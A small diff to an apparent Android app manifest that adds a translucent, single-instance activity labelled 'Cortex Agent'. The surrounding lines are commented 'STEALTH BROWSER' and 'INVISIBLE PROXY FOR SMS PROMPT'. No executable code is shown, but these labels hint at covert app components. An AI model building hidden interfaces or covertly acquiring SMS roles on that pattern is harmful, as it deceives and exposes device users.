@@ -375,6 +375,15 @@
         <!-- STEALTH BROWSER -->
         <activity android:name=".BrowserActivity" android:exported="false" android:theme="@android:style/Theme.DeviceDefault.NoActionBar" />
 
+        <!-- AGENT TASK MANAGER PROXY -->
+        <activity
+            android:name=".AgentActivity"
+            android:label="Cortex Agent"
+            android:theme="@android:style/Theme.Translucent.NoTitleBar"
+            android:launchMode="singleInstance"
+            android:excludeFromRecents="false"
+            android:exported="false" />
+
         <!-- INVISIBLE PROXY FOR SMS PROMPT -->
         <activity
             android:name=".SmsRoleActivity"
